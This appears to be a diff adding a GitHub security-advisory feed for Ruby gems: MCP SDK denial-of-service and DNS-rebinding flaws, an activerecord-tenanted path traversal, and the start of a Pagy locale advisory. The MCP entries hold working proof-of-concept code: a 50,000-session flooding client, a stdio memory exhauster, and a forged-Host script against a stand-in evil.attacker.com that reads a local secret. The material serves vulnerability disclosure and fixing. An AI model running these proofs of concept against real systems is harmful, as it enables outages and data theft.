+<p>Starts the transport in its default configuration (no <code>session_idle_timeout</code>) and reports the in-memory session count plus process RSS every two seconds.</p>
+<pre><code class="language-ruby">require "bundler/setup"
+require "mcp"
+require "mcp/server/transports/streamable_http_transport"
+require "rackup"
+require "webrick"
+require "rackup/handler/webrick"
+
+server = MCP::Server.new(name: "session-poc-target", tools: [])
+transport = MCP::Server::Transports::StreamableHTTPTransport.new(server)
+
+Thread.new do
+  loop do
+    sessions = transport.instance_variable_get(:@sessions)
+    count = sessions ? sessions.size : 0
+    rss_mb = `ps -o rss= -p #{Process.pid}`.to_i / 1024
+    STDERR.puts("[mem] sessions=#{count}  RSS=#{rss_mb} MB")
+    sleep 2
+  end
+end
+
+STDERR.puts("[poc] listening on http://127.0.0.1:9295/")
+Rackup::Handler::WEBrick.run(
+  transport,
+  Host: "127.0.0.1", Port: 9295,
+  AccessLog: [], Logger: WEBrick::Log.new(File::NULL),
+)
+</code></pre>
+<h3 id="client-session_poc_clientpy">Client (<code>session_poc_client.py</code>)</h3>
+<pre><code class="language-python">import concurrent.futures, json, socket, time
+
+HOST, PORT = "127.0.0.1", 9295
+TOTAL, WORKERS = 50_000, 32
+
+INIT = json.dumps({
+    "jsonrpc": "2.0", "id": 1, "method": "initialize",
+    "params": {"protocolVersion": "2025-11-25", "capabilities": {},
+               "clientInfo": {"name": "flooder", "version": "1.0"}}
+}).encode()
+
+REQ = (
+    f"POST / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
+    f"Content-Type: application/json\r\n"
+    f"Accept: application/json, text/event-stream\r\n"
+    f"Content-Length: {len(INIT)}\r\nConnection: close\r\n\r\n"
+).encode() + INIT
+
+def one():
+    try:
+        s = socket.create_connection((HOST, PORT), timeout=5)
+        s.sendall(REQ)
+        data = b""
+        while True:
+            c = s.recv(8192)
+            if not c: break
+            data += c
+        s.close()
+        return b"mcp-session-id" in data.lower()
+    except OSError:
+        return False
+
+start = time.time()
+created = 0
+with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as ex:
+    futs = [ex.submit(one) for _ in range(TOTAL)]
+    for i, f in enumerate(concurrent.futures.as_completed(futs), 1):
+        if f.result():
+            created += 1
+        if i % 1000 == 0:
+            print(f"[poc] dispatched {i} reqs, {created} sessions confirmed, "
+                  f"elapsed {time.time() - start:.1f}s")
+
+print(f"[poc] done. {created}/{TOTAL} sessions confirmed in "
+      f"{time.time() - start:.1f}s")
+</code></pre>
+<h3 id="reproduction-commands">Reproduction commands</h3>
+<pre><code class="language-sh">bundle install
+ruby session_poc_server.rb          # terminal A
+python3 session_poc_client.py       # terminal B
+</code></pre>
+<h3 id="observed-result">Observed result</h3>
+<p>Tested on macOS, Ruby 3.2.4, against the SDK's <code>main</code> branch.</p>
+<p>Server terminal:</p>
+<pre><code>[mem] sessions=0      RSS=45  MB
+[mem] sessions=2605   RSS=56  MB
+[mem] sessions=11587  RSS=72  MB
+[mem] sessions=23119  RSS=85  MB
+[mem] sessions=34391  RSS=119 MB
+[mem] sessions=45325  RSS=128 MB
+[mem] sessions=50000  RSS=154 MB
+[mem] sessions=50000  RSS=152 MB
+[mem] sessions=50000  RSS=152 MB
+[mem] sessions=50000  RSS=152 MB     # plateau persists indefinitely
+</code></pre>
+<p>Client terminal:</p>
+<pre><code>[poc] dispatched 50000 reqs, 50000 sessions confirmed, elapsed 26.6s
+[poc] done. 50000/50000 sessions confirmed in 26.6s
+</code></pre>
+<p>50,000 unique sessions are created and retained in 26.6 seconds from a single client. The session count remains pinned at 50,000 indefinitely, confirming that no reaper exists to free the records. Scaling the attack linearly (multiple clients, larger client-capability payloads, longer runtime) drives RSS until the worker is OOM-killed.</p>
+<img src="https://github.com/user-attachments/assets/89ac35ab-5629-4b48-83f8-e26a92b3e45c" alt="image" height="1674" width="3544">
+
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Attacker requirements:</strong> unauthenticated TCP reach of the MCP endpoint. No session, no credentials.</li>
+<li><strong>Effect:</strong> memory-exhaustion denial of service. A sustained or distributed attacker can OOM the worker; on services that recycle workers, the attacker simply repeats. On multi-tenant gateways, one tenant can starve all others.</li>
+<li><strong>Affected deployments:</strong> every deployment that does not opt into <code>session_idle_timeout</code>. Because the README presents this as an opt-in mitigation rather than a default, real-world deployments are likely to ship vulnerable.</li>
+</ul>
+<h2 id="suggested-mitigation">Suggested mitigation</h2>
+<ol>
+<li>Change the default of <code>session_idle_timeout</code> to a finite value (e.g. 30 minutes) and document the change as a security default.</li>
+<li>Add a <code>max_sessions:</code> constructor option; reject <code>initialize</code> with HTTP 503 once the cap is reached.</li>
+<li>Track the time of the <code>initialize</code> POST separately from later request activity, and evict sessions whose GET SSE stream is never attached within N seconds.</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-52jp-gj8w-j6xh">https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-52jp-gj8w-j6xh</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67430">https://nvd.nist.gov/vuln/detail/CVE-2026-67430</a></li>
+<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/commit/afb968c468c178c4d3294b423fcce250621692f4">https://github.com/modelcontextprotocol/ruby-sdk/commit/afb968c468c178c4d3294b423fcce250621692f4</a></li>
+<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0">https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-52jp-gj8w-j6xh">https://github.com/advisories/GHSA-52jp-gj8w-j6xh</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-52jp-gj8w-j6xh</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-30T14:43:29.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mcp] MCP Ruby SDK: Unbounded line buffer in stdio transports leads to memory exhaustion (DoS)]]></title>
+        <id>https://github.com/advisories/GHSA-7683-3w9x-ch42</id>
+        <link href="https://github.com/advisories/GHSA-7683-3w9x-ch42"/>
+        <updated>2026-07-30T14:41:58.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The stdio transports in <code>MCP::Server::Transports::StdioTransport</code> and <code>MCP::Client::Stdio</code> read newline-delimited JSON-RPC frames using <code>IO#gets</code> with no <code>limit</code> argument. CRuby's <code>IO#gets</code> with no limit reads from the current position until the next separator (<code>\n</code>) with no upper bound on the returned string length. A peer that streams bytes without ever emitting a newline causes <code>gets</code> to accumulate the entire stream in a single Ruby <code>String</code> until the process is killed by the operating-system OOM killer.</p>
+<p>This is the same vulnerability class tracked in sibling MCP SDKs as GHSA-74gp-qhv5-v493 (Kotlin), GHSA-wqgc-pwpr-pq7r (TypeScript), GHSA-655q-2283-6jgj (Python), and others. It was identified during a cross-SDK audit; ruby-sdk had no prior report.</p>
+<h2 id="affected-code">Affected code</h2>
+<p>Verified at <code>main</code> @ <code>cf44475c</code>.</p>
+<h3 id="server-transport--libmcpservertransportsstdio_transportrb">Server transport — <a href="https://github.com/modelcontextprotocol/ruby-sdk/blob/cf44475c/lib/mcp/server/transports/stdio_transport.rb"><code>lib/mcp/server/transports/stdio_transport.rb</code></a></h3>
+<pre><code class="language-ruby"># line 23
+while @open &amp;&amp; (line = $stdin.gets)        # &lt;-- no limit argument
+  response = @session.handle_json(line.strip)
+  ...
+
+# line 76
+while @open &amp;&amp; (line = $stdin.gets)        # &lt;-- no limit argument
+  begin
+    parsed = JSON.parse(line.strip, symbolize_names: true)
+</code></pre>
+<p><code>$stdin</code> is the raw process global (only <code>set_encoding</code> is applied at line 16); there is no wrapper imposing a length limit.</p>
+<h3 id="client-transport--libmcpclientstdiorb">Client transport — <a href="https://github.com/modelcontextprotocol/ruby-sdk/blob/cf44475c/lib/mcp/client/stdio.rb"><code>lib/mcp/client/stdio.rb</code></a></h3>
+<pre><code class="language-ruby"># line 150
+@stdin, @stdout, @stderr, @wait_thread = Open3.popen3(spawn_env, @command, *@args)
+
+# line 228
+line = @stdout.gets                         # &lt;-- no limit argument
+raise_connection_error!(method, params) if line.nil?
+parsed = JSON.parse(line.strip)
+</code></pre>
+<p><code>@stdout</code> is the raw <code>IO</code> returned by <code>Open3.popen3</code>. The <code>@read_timeout</code> guard at line 227 (<code>wait_for_readable!</code>) only gates the <code>IO.select</code> before <code>gets</code> is invoked; once bytes are flowing, <code>gets</code> blocks indefinitely accumulating into one string.</p>
+<h2 id="impact">Impact</h2>
+<p>Denial of service via memory exhaustion. A peer that controls the byte stream delivered to the stdio transport can grow a single Ruby <code>String</code> until the process exhausts available memory.</p>
+<p><strong>Threat-model caveat (important):</strong> In the default stdio deployment, the peer process already holds local execution privileges equal to or greater than the victim:</p>
+<ul>
+<li>On the <strong>server</strong> side (<code>StdioTransport#open</code>), the writer to <code>$stdin</code> is the parent process that spawned the server, which already holds <code>Process.kill</code>, environment control, and filesystem access over the child. This direction is a robustness defect rather than a security boundary in typical deployments.</li>
+<li>On the <strong>client</strong> side (<code>Client::Stdio#read_response</code>), the writer is the third-party MCP server binary the host application chose to spawn via <code>Open3.popen3</code>. In an unsandboxed deployment that binary already has local code execution as the host user.</li>
+</ul>
+<p>This issue is primarily a security concern for:</p>
+<ul>
+<li>(a) host applications that <strong>sandbox</strong> the spawned MCP server (container, restricted user, seccomp) while piping its stdout to an unsandboxed host process — an unbounded <code>gets</code> lets a memory-capped sandboxed process exhaust the unconstrained host;</li>
+<li>(b) <strong>HTTP-to-stdio bridge</strong> deployments that forward bytes from a remote peer to a stdio server's stdin (note: surveyed bridges re-frame JSON-RPC and emit their own newlines, mitigating this in practice);</li>
+<li>(c) <strong>robustness</strong> against non-malicious servers that emit large unterminated output (misconfigured logging to stdout, runaway loops), which can crash the host process and all other MCP sessions it manages.</li>
+</ul>
+<p>The bug fires before the JSON-RPC <code>initialize</code> handshake, since <code>gets</code> cannot return until <code>\n</code> arrives.</p>
+<h2 id="reproduction">Reproduction</h2>
+<pre><code class="language-ruby"># poc_ruby_stdio_oom.rb — drives the real client transport against a producer that never emits \n
+require "mcp/client/stdio"
+
+# `yes` writes "y\n" — instead use a producer that never sends \n:
+producer = %q{ruby -e 'STDOUT.sync=true; loop { print "A" * 65536 }'}
+
+client = MCP::Client::Stdio.new(command: "bash", args: ["-c", producer])
+client.start
+# any request triggers read_response → @stdout.gets → unbounded String growth
+client.send_request(method: "initialize", params: {})
+</code></pre>
+<p>Observed: process RSS grows linearly with bytes produced; <code>gets</code> never returns; process is OOM-killed.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p><code>IO#gets</code> accepts a second <code>limit</code> argument. Apply a configurable maximum line length (default suggested: 4 MiB — large enough for any realistic JSON-RPC frame including base64-embedded images) at all three call sites, and treat an over-limit line as a transport error that closes the connection:</p>
+<pre><code class="language-ruby">MAX_LINE_BYTES = 4 * 1024 * 1024
+
+while @open &amp;&amp; (line = $stdin.gets("\n", MAX_LINE_BYTES))
+  unless line.end_with?("\n")
+    # gets returned because the limit was hit, not because a newline arrived
+    raise MCP::TransportError, "stdio frame exceeds #{MAX_LINE_BYTES} bytes without newline"
+  end
+  ...
+end
+</code></pre>
+<p>Apply the same pattern at <code>stdio_transport.rb:76</code> and <code>client/stdio.rb:228</code>. Expose <code>MAX_LINE_BYTES</code> as a constructor option on both transports for callers with legitimate large-frame needs.</p>
+<h2 id="credit">Credit</h2>
+<p>Identified during a cross-SDK audit of the stdio unbounded-buffer vulnerability class, prompted by GHSA-74gp-qhv5-v493 (reporter: tonghuaroot).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-7683-3w9x-ch42">https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-7683-3w9x-ch42</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63119">https://nvd.nist.gov/vuln/detail/CVE-2026-63119</a></li>
+<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/commit/267b8fa6285453525c81ce43db6b7dcd7a8a8c2f">https://github.com/modelcontextprotocol/ruby-sdk/commit/267b8fa6285453525c81ce43db6b7dcd7a8a8c2f</a></li>
+<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0">https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-7683-3w9x-ch42">https://github.com/advisories/GHSA-7683-3w9x-ch42</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7683-3w9x-ch42</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-30T14:41:58.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mcp] MCP Ruby SDK: Streamable HTTP transport lacks DNS-rebinding (Host/Origin) protection]]></title>
+        <id>https://github.com/advisories/GHSA-rjr6-rcgv-9m7m</id>
+        <link href="https://github.com/advisories/GHSA-rjr6-rcgv-9m7m"/>
+        <updated>2026-07-30T14:41:42.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>MCP::Server::Transports::StreamableHTTPTransport</code> (the Rack-mountable Streamable HTTP transport in the <code>mcp</code> gem) processes every incoming JSON-RPC request without ever inspecting the HTTP <code>Host</code> or <code>Origin</code> request headers. There is no <code>AllowedHosts</code>/<code>AllowedOrigins</code> allowlist and no DNS-rebinding guard anywhere in the transport. A local MCP server that binds a loopback or LAN HTTP port is therefore reachable by any web origin a victim's browser visits, via a DNS-rebinding attack: a malicious page rebinds its own hostname to <code>127.0.0.1</code>, then drives the local MCP server cross-origin to enumerate and invoke its tools and exfiltrate their output. This is the standard browser-driven local-service attack that the MCP Streamable HTTP guidance exists to prevent.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li>An attacker who can get a victim to open a web page can reach any MCP server the victim runs locally over the Streamable HTTP transport (e.g. a developer-tools or filesystem MCP server on <code>localhost</code>).</li>
+<li>Because the transport issues a session and dispatches <code>tools/list</code> / <code>tools/call</code> from a foreign <code>Host</code>/<code>Origin</code> with no rejection, the attacker can drive arbitrary server-exposed tools and read their results, exfiltrating local data (files, secrets, command output) to the attacker's origin.</li>
+<li>The blast radius is whatever the locally-running MCP server exposes. For MCP servers wired to filesystem, shell, or credential tools, this is sensitive-data disclosure and, depending on the tool set, local action execution.</li>
+</ul>
+<h2 id="vulnerable-code">Vulnerable code</h2>
+<p>File: <code>lib/mcp/server/transports/streamable_http_transport.rb</code> (gem <code>mcp</code> 0.18.0).</p>
+<p>The Rack entrypoint and POST handler validate <code>Accept</code>, <code>Content-Type</code>, <code>Mcp-Session-Id</code>, and <code>Mcp-Protocol-Version</code>, but never <code>Host</code> or <code>Origin</code>:</p>
+<pre><code class="language-ruby"># call(env) -&gt; handle_request(Rack::Request.new(env))  (line 56)
+def handle_post(request)
+  required_types = @enable_json_response ? REQUIRED_POST_ACCEPT_TYPES_JSON : REQUIRED_POST_ACCEPT_TYPES_SSE
+  accept_error = validate_accept_header(request, required_types)   # line 335 - checks Accept only
+  return accept_error if accept_error
+
+  content_type_error = validate_content_type(request)             # line 338 - checks Content-Type only
+  return content_type_error if content_type_error
+
+  body_string = request.body.read
+  session_id = extract_session_id(request)                        # line 342 - reads HTTP_MCP_SESSION_ID
+</code></pre>
+<p>No statement anywhere in <code>handle_post</code>, <code>handle_request</code>, or any helper reads <code>request.env["HTTP_HOST"]</code> or <code>request.env["HTTP_ORIGIN"]</code>.</p>
+<p>The only request-env reads in the whole class are:</p>
+<ul>
+<li><code>extract_session_id</code> -&gt; <code>request.env["HTTP_MCP_SESSION_ID"]</code> (line 489)</li>
+<li><code>validate_accept_header</code> -&gt; <code>request.env["HTTP_ACCEPT"]</code> (line 493)</li>
+<li><code>validate_content_type</code> -&gt; <code>request.env["CONTENT_TYPE"]</code> (line 512)</li>
+<li><code>validate_protocol_version_header</code> -&gt; <code>request.env["HTTP_MCP_PROTOCOL_VERSION"]</code> (line 546)</li>
+</ul>
+<p>A repository-wide search of <code>lib/</code> for <code>HTTP_HOST</code>, <code>HTTP_ORIGIN</code>, <code>allowed_host</code>, <code>allowed_origin</code>, <code>rebind</code>, or <code>dns.rebind</code> returns zero matches, confirming no allowlist or rebinding guard exists in the shipped library. The <code>examples/</code> tree mounts <code>Rack::Cors</code> as application-level middleware, but that is example glue, not a transport-level control, and CORS does not stop a DNS-rebinding attack that arrives as a same-origin request after rebinding.</p>
+<h2 id="how-the-input-reaches-the-sink-attack-scenario">How the input reaches the sink (attack scenario)</h2>
+<ol>
+<li>A developer runs an MCP server over <code>StreamableHTTPTransport</code>, mounted as a Rack app on a local HTTP port (loopback or LAN).</li>
+<li>The victim opens <code>http://evil.attacker.com</code> in a browser. The page resolves to the attacker's server, which then re-answers DNS for <code>evil.attacker.com</code> with <code>127.0.0.1</code> (DNS rebinding). The browser now treats requests to <code>evil.attacker.com</code> as going to the local MCP server, with <code>Host: evil.attacker.com</code> / <code>Origin: http://evil.attacker.com</code>.</li>
+<li>The page POSTs an <code>initialize</code> request. The transport accepts it (it never looks at <code>Host</code>/<code>Origin</code>), creates a session, and returns <code>Mcp-Session-Id</code>.</li>
+<li>The page then POSTs <code>tools/call</code>, and the transport executes the server's tool and returns its output to the foreign origin. Local data is exfiltrated.</li>
+</ol>
+<h2 id="proof-of-concept-end-to-end-reproduction">Proof of concept (end-to-end reproduction)</h2>
+<p>Run against the real released gem <code>mcp</code> 0.18.0 (no stubs). The script builds an <code>MCP::Server</code> with a tool that returns sensitive local data, instantiates the real <code>StreamableHTTPTransport</code>, and drives it with <code>Rack::Request</code> env hashes carrying a forged <code>Host</code>/<code>Origin</code>. It then re-runs as a legitimate localhost client (negative control).</p>
+<p>Install:</p>
+<pre><code>gem install mcp -v 0.18.0   # pulls addressable, json-schema, public_suffix
+gem install rack            # required by StreamableHTTPTransport
+</code></pre>
+<p>PoC (<code>poc_f1_dnsrebind.rb</code>):</p>
+<pre><code class="language-ruby"># frozen_string_literal: true
+require "mcp"
+require "rack"
+require "json"
+require "stringio"
+
+puts "mcp gem version under test: #{MCP::VERSION}"
+puts "transport source: #{MCP::Server::Transports::StreamableHTTPTransport.instance_method(:handle_post).source_location.inspect}"
+puts
+
+# A tool whose output is sensitive local data an attacker wants to exfiltrate.
+secret_tool = MCP::Tool.define(name: "read_local_secret", description: "returns a local secret") do |*|
+  MCP::Tool::Response.new([{ type: "text", text: "TOP-SECRET-LOCAL-DATA-9f3a" }])
+end
+
+server = MCP::Server.new(name: "poc_server", version: "1.0.0", tools: [secret_tool])
+transport = MCP::Server::Transports::StreamableHTTPTransport.new(server)
+PROTO = MCP::Configuration::SUPPORTED_STABLE_PROTOCOL_VERSIONS.last
+
+def rack_post(transport, body_hash, host:, origin:, session_id: nil, proto: nil)
+  body = JSON.generate(body_hash)
+  env = {
+    "REQUEST_METHOD" =&gt; "POST", "PATH_INFO" =&gt; "/",
+    "HTTP_HOST"   =&gt; host,    # attacker-controlled Host (DNS-rebind primary vector)
+    "HTTP_ORIGIN" =&gt; origin,  # attacker-controlled Origin (cross-origin browser vector)
+    "HTTP_ACCEPT" =&gt; "application/json, text/event-stream",
+    "CONTENT_TYPE" =&gt; "application/json",
+    "rack.input" =&gt; StringIO.new(body), "CONTENT_LENGTH" =&gt; body.bytesize.to_s,
+  }
+  env["HTTP_MCP_SESSION_ID"] = session_id if session_id
+  env["HTTP_MCP_PROTOCOL_VERSION"] = proto if proto
+  status, headers, resp = transport.call(env)
+  collected = +""
+  if resp.respond_to?(:each)
+    resp.each { |c| collected &lt;&lt; c.to_s }
+  elsif resp.respond_to?(:call)            # stateful tools/call returns an SSE-stream Proc body
+    sink = Object.new
+    sink.define_singleton_method(:write) { |s| collected &lt;&lt; s.to_s }
+    sink.define_singleton_method(:flush) {}
+    sink.define_singleton_method(:close) {}
+    resp.call(sink)
+  end
+  [status, headers, collected]
+end
+
+puts "========== ATTACK: forged Host: attacker.evil.com  Origin: http://evil.attacker.com =========="
+init_body = { jsonrpc: "2.0", id: 1, method: "initialize",
+  params: { protocolVersion: PROTO, capabilities: {}, clientInfo: { name: "evil-page", version: "1.0" } } }
+status, headers, body = rack_post(transport, init_body, host: "attacker.evil.com", origin: "http://evil.attacker.com")
+puts "[initialize] HTTP status      : #{status}"
+puts "[initialize] Mcp-Session-Id   : #{headers["Mcp-Session-Id"].inspect}"
+puts "[initialize] response body     : #{body}"
+session = headers["Mcp-Session-Id"]
+
+call_body = { jsonrpc: "2.0", id: 2, method: "tools/call",
+  params: { name: "read_local_secret", arguments: {} } }
+status2, _h2, body2 = rack_post(transport, call_body,
+  host: "attacker.evil.com", origin: "http://evil.attacker.com", session_id: session, proto: PROTO)
+puts "[tools/call] HTTP status       : #{status2}"
+puts "[tools/call] response body      : #{body2}"
+attack_ok = (status == 200 &amp;&amp; session &amp;&amp; status2 == 200 &amp;&amp; body2.include?("TOP-SECRET-LOCAL-DATA-9f3a"))
+puts
+puts "ATTACK VERDICT: #{attack_ok ? "EXFILTRATED" : "blocked"} -- foreign Host/Origin obtained a session AND read the local secret with NO 403."
+puts
+
+puts "========== NEGATIVE CONTROL: legitimate Host: 127.0.0.1:8080  Origin: http://127.0.0.1:8080 =========="
+status3, headers3, _b3 = rack_post(transport, init_body, host: "127.0.0.1:8080", origin: "http://127.0.0.1:8080")
+puts "[initialize] HTTP status      : #{status3}"
+puts "[initialize] Mcp-Session-Id   : #{headers3["Mcp-Session-Id"].inspect}"
+puts
+puts "CONTROL VERDICT: legitimate client also gets HTTP #{status3} + session -- transport applies the SAME (zero) Host/Origin policy to both."
+</code></pre>
+<p>Captured output (verbatim):</p>
+<pre><code>mcp gem version under test: 0.18.0
+transport source: [".../gems/mcp-0.18.0/lib/mcp/server/transports/streamable_http_transport.rb", 333]
+
+========== ATTACK: forged Host: attacker.evil.com  Origin: http://evil.attacker.com ==========
+[initialize] HTTP status      : 200
+[initialize] Mcp-Session-Id   : "d4fb30b4-b4ec-49a1-a58b-f4cc02bee64b"
+[initialize] response body     : {"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"tools":{"listChanged":true},"prompts":{"listChanged":true},"resources":{"listChanged":true},"logging":{}},"serverInfo":{"name":"poc_server","version":"1.0.0"}}}
+[tools/call] HTTP status       : 200
+[tools/call] response body      : data: {"jsonrpc":"2.0","id":2,"result":{"content":[{"type":"text","text":"TOP-SECRET-LOCAL-DATA-9f3a"}],"isError":false}}
+
+ATTACK VERDICT: EXFILTRATED -- foreign Host/Origin obtained a session AND read the local secret with NO 403.
+
+========== NEGATIVE CONTROL: legitimate Host: 127.0.0.1:8080  Origin: http://127.0.0.1:8080 ==========
+[initialize] HTTP status      : 200
+[initialize] Mcp-Session-Id   : "bf707a19-a22a-4ff2-aeae-62c20cd7141b"
+
+CONTROL VERDICT: legitimate client also gets HTTP 200 + session -- transport applies the SAME (zero) Host/Origin policy to both.
+</code></pre>
+<p>The forged <code>Host: attacker.evil.com</code> / <code>Origin: http://evil.attacker.com</code> request obtained a valid session and exfiltrated the local secret (<code>TOP-SECRET-LOCAL-DATA-9f3a</code>) via <code>tools/call</code>, with the transport returning HTTP 200 throughout and never a 403. The negative control confirms the transport applies the identical (empty) policy to a legitimate localhost client, proving there is no Host/Origin discrimination at all.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Add an opt-in but secure-by-default Host/Origin allowlist to <code>StreamableHTTPTransport</code>, mirroring the DNS-rebinding protection that the TypeScript, Python, Go, Rust, C#, and Java MCP SDKs already ship:</p>
+<ul>
+<li>Accept <code>allowed_hosts:</code> and <code>allowed_origins:</code> keyword arguments in <code>initialize</code>.</li>
+<li>In <code>handle_request</code> (before any dispatch), read <code>request.env["HTTP_HOST"]</code> and <code>request.env["HTTP_ORIGIN"]</code>. If an allowlist is configured and the value is not on it, return <code>403 Forbidden</code>.</li>
+<li>Default to allowing only loopback hosts (<code>127.0.0.1</code>, <code>[::1]</code>, <code>localhost</code>) and an empty/absent <code>Origin</code>, so a stock local deployment is protected against rebinding out of the box while same-process and same-host clients keep working. Document how to widen the allowlist for non-loopback deployments.</li>
+</ul>
+<p>A concrete patch adds an <code>AllowedHostsValidation</code> check invoked at the top of <code>handle_request</code>. See the Fix PR.</p>
+<h2 id="fix-pr">Fix PR</h2>
+<p>A fix PR implementing the Host/Origin allowlist with a secure loopback default is open against this advisory's private temporary fork: <a href="https://github.com/modelcontextprotocol/ruby-sdk-ghsa-rjr6-rcgv-9m7m/pull/1">https://github.com/modelcontextprotocol/ruby-sdk-ghsa-rjr6-rcgv-9m7m/pull/1</a> . With the patch loaded, the forged-Host request is rejected with <code>403</code> (<code>{"error":"Forbidden: Host not allowed (DNS-rebinding protection)"}</code>) while a legitimate loopback <code>Host: 127.0.0.1:8080</code> request is still served (HTTP 200, session issued).</p>
+<h2 id="credit">Credit</h2>
+<p>Reported by tonghuaroot.</p>
+<h2 id="reporter-notes">Reporter notes</h2>
+<p>This issue was found by source review of the <code>mcp</code> gem's Streamable HTTP transport and confirmed end-to-end against the released gem <code>mcp</code> 0.18.0 as shown above. It is reported independently on its own merits.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-rjr6-rcgv-9m7m">https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-rjr6-rcgv-9m7m</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63118">https://nvd.nist.gov/vuln/detail/CVE-2026-63118</a></li>
+<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/commit/ba543083a7594e7892b29464b89091816446ff7a">https://github.com/modelcontextprotocol/ruby-sdk/commit/ba543083a7594e7892b29464b89091816446ff7a</a></li>
+<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0">https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-rjr6-rcgv-9m7m">https://github.com/advisories/GHSA-rjr6-rcgv-9m7m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rjr6-rcgv-9m7m</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-30T14:41:39.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[activerecord-tenanted] ActiveRecord::Tenanted::Storage::DiskService#path_for has a possible path traversal]]></title>
+        <id>https://github.com/advisories/GHSA-pmwx-rm49-xv39</id>
+        <link href="https://github.com/advisories/GHSA-pmwx-rm49-xv39"/>
+        <updated>2026-07-29T17:06:01.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Active Record Tenanted's override of Active Storage's <code>DiskService#path_for</code> does not validate that the resolved filesystem path remains within the storage root directory. If a blob key containing path traversal sequences (e.g. <code>../</code>) is used, it could allow reading, writing, or deleting arbitrary files on the server. Blob keys are expected to be trusted strings, but some applications could be passing user input as keys and would be affected.</p>
+<h3 id="mitigation">Mitigation</h3>
+<p>Upgrade to Active Record Tenanted v0.7.0 or later.</p>
+<p>As a workaround, do not use untrusted user input as blob keys. Blob keys are expected to be trusted strings.</p>
+<h3 id="credit">Credit</h3>
+<p>This issue was responsibly reported by @tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/basecamp/activerecord-tenanted/security/advisories/GHSA-pmwx-rm49-xv39">https://github.com/basecamp/activerecord-tenanted/security/advisories/GHSA-pmwx-rm49-xv39</a></li>
+<li><a href="https://github.com/rails/rails/security/advisories/GHSA-9xrj-h377-fr87">https://github.com/rails/rails/security/advisories/GHSA-9xrj-h377-fr87</a></li>
+<li><a href="https://github.com/basecamp/activerecord-tenanted/pull/307">https://github.com/basecamp/activerecord-tenanted/pull/307</a></li>
+<li><a href="https://github.com/basecamp/activerecord-tenanted/commit/b242c8ad9bf58bbd7f5a032d153b0f29db54b9ba">https://github.com/basecamp/activerecord-tenanted/commit/b242c8ad9bf58bbd7f5a032d153b0f29db54b9ba</a></li>
+<li><a href="https://github.com/basecamp/activerecord-tenanted/releases/tag/v0.7.0">https://github.com/basecamp/activerecord-tenanted/releases/tag/v0.7.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-pmwx-rm49-xv39">https://github.com/advisories/GHSA-pmwx-rm49-xv39</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-pmwx-rm49-xv39</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-29T17:06:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pagy] Pagy I18n locale option is not validated before being used in a file path]]></title>
+        <id>https://github.com/advisories/GHSA-2xmw-f8j8-wfxc</id>
+        <link href="https://github.com/advisories/GHSA-2xmw-f8j8-wfxc"/>
+        <updated>2026-07-28T22:25:30.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>Pagy::I18n.locale=</code> did not validate its argument before using it as a
+path component to load the matching dictionary file (<code>&lt;locale&gt;.yml</code>). An
+application that assigns untrusted input to the locale — e.g. the common
+pattern <code>Pagy::I18n.locale = params[:locale]</code> — let that input influence
